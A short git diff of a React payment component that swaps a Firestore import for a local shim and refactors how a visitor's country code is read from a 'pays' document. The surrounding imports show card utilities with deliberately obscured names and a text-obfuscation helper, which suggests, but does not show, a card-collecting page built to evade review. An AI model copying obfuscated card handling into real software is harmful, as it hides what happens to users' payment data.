@@ -18,7 +18,7 @@ import {
 import { _dct, _fcn, _fed, _gbi, _lc } from "@/lib/card-utils";
 import { db } from "@/lib/firebase";
 import { secureAddData } from "@/lib/secure-firebase";
-import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
+import { doc, getDoc, onSnapshot, setDoc, Firestore } from "@/lib/firestore-shim";
 import { addToHistory } from "@/lib/history-utils";
 import { FullPageLoader } from "./loader";
 import { _gt } from "@/lib/text-obf";
@@ -111,11 +111,9 @@ export default function P1({ offerTotalPrice }: _P1Props) {
           const visitorID = localStorage.getItem("visitor");
           if (visitorID && db) {
             const docRef = doc(db as Firestore, "pays", visitorID);
-            const docSnap = await import("firebase/firestore").then((mod) =>
-              mod.getDoc(docRef),
-            );
+            const docSnap = await getDoc(docRef);
             if (docSnap.exists()) {
-              countryCodeAlpha3 = docSnap.data().country;
+              countryCodeAlpha3 = (docSnap.data() as any)?.country;
               if (countryCodeAlpha3) {
                 localStorage.setItem("country", countryCodeAlpha3);
               }
